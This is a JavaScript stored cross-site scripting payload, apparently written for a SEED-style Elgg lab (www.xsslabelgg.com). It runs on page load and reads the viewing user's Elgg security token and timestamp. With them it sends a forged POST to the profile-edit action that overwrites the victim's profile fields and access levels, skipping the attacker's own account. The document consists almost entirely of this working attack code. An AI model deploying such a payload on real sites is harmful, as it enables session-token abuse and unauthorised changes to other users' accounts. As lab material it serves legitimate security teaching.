<script type="text/javascript">
window.onload = function(){
	
//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
//and Security Token __elgg_token
var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
var token="&__elgg_token="+elgg.security.token.__elgg_token;

//Url for editing profile
var sendurl="/action/profile/edit"; //FILL IN
//Constructing contents with textfields with random texts and setting all access level to 1(logged in users)
var content="guid="+elgg.session.user.guid + token + ts+"&accesslevel[briefdescription]=1&";
content = content +"accesslevel[contactemail]=1&accesslevel[description]=1&accesslevel[interests]=1&accesslevel[location]=1&";
content = content +"accesslevel[mobile]=1&accesslevel[phone]=1&accesslevel[skills]=1&accesslevel[twitter]=1&";
content = content +"accesslevel[website]=1&briefdescription=1605118&contactemail=random@gmai.com&description=<p>random texts</p>&";
content = content +"&interests=randTxts&location=randTxts&mobile=123&name=Name&phone=567";

//checking so that Sami is not affected
	if(elgg.session.user.guid!=47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);	
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
		Ajax.send(content);
	}
}
</script>
